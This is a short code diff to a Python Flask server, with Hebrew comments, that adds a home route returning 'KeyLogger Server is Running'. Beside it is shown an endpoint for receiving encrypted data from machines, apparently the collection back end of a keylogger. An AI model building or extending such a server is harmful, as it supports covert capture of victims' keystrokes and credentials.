@@ -15,7 +15,9 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 data_dir = "data"
 os.makedirs(data_dir, exist_ok=True)  # יצירת התיקייה אם היא לא קיימת
 
-
+@app.route('/')
+def home():
+    return f"KeyLogger Server is Running"
 
 # נקודת קצה (endpoint) לקבלת נתונים מוצפנים ממכונה
 @app.route("/api/send_data", methods=["POST"])
